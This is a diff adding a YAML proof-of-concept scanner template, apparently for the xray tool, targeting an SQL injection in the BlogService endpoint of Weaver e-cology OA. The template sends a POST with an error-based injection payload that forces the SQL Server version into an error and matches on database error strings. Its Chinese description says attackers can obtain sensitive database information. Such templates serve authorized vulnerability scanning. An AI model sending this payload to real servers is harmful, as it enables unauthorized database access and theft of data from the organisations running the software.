@@ -1,0 +1,18 @@
+name: poc-yaml-weaver-ecology-blogservice-sqli
+groups:
+  sqli:
+    - method: POST
+      path: /weaver/bpmdocument/BlogService
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        id=1'+AND+1=CONVERT(int,@@version)--
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"Microsoft SQL Server") || response.body.bcontains(b"ODBC") || response.body.bcontains(b"Conversion failed") || response.body.bcontains(b"SQL"))
+detail:
+  author: L4xy
+  description: "泛微OA e-cology BlogService接口存在SQL注入漏洞，攻击者可通过构造恶意请求获取数据库敏感信息"
+  links:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEecology%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3BlogService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: sqli,weaver,ecology
